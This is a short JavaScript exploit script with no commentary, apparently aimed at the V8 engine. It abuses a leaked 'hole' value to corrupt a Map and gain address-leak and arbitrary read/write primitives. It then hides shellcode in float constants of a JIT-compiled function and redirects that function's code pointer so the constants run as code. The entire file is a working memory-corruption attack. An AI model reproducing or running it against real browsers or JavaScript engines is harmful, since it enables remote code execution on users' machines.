var conversion_buffer=new ArrayBuffer(8);
var f64_v=new Float64Array(conversion_buffer);
var u64_v=new BigUint64Array(conversion_buffer);
BigInt.prototype.hex=function () { return "0x"+this.toString(16); };
BigInt.prototype.i2f=function () { u64_v[0]=this; return f64_v[0]; };
Number.prototype.f2i=function (){ f64_v[0]=this; return u64_v[0]; };
var wasm_code=new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod=new WebAssembly.Module(wasm_code);
var wasm_instance=new WebAssembly.Instance(wasm_mod);
function addrof(obj) {
	var map=new Map();
	let hole=[].hole();
	map.set(1,1);
	map.set(hole,1);
	map.delete(hole);
	map.delete(hole);
	map.delete(1);
	var adjacent=[1.1, 2.2];
	map.set(0x10, 1);
	map.set(obj, 1);
	return adjacent[0].f2i() & 0xffffffffn;
}
const foo=()=> { return [1.0, 1.95538254221075331056310651818E-246, 1.95606125582421466942709801013E-246, 1.99957147195425773436923756715E-246, 1.95337673326740932133292175341E-246, 2.63486047652296056448306022844E-284]; };
for (let i=0; i < 0x10000; i++) foo();
var addr_wasm_instance=addrof(wasm_instance);
var map=new Map();
let hole=[].hole();
map.set(1,1);
map.set(hole,1);
map.delete(hole);
map.delete(hole);
map.delete(1);

var adjacent=[];
var victim=[1.1];
var ab=new ArrayBuffer(0x200);
var fview=new Float64Array(ab);
var view=new DataView(ab);
adjacent[0]=1.1;
map.set(0x10, 1);
map.set(victim, 0x1111);
function aar(where) {
	adjacent[0]=((2n << 32n)|where).i2f();
	return victim[0].f2i();
}
function aaw32(where, what) {
	adjacent[0]=((2n << 32n)|where).i2f();
	victim[0]=what.i2f();
}
var addr_jitted=aar(addrof(foo)+0x10n) & 0xffffffffn;
var rx_region=aar(addr_jitted+0x4n);
aaw32(addr_jitted+0x4n, rx_region+0x90n-0x20n+0xcn);
foo();
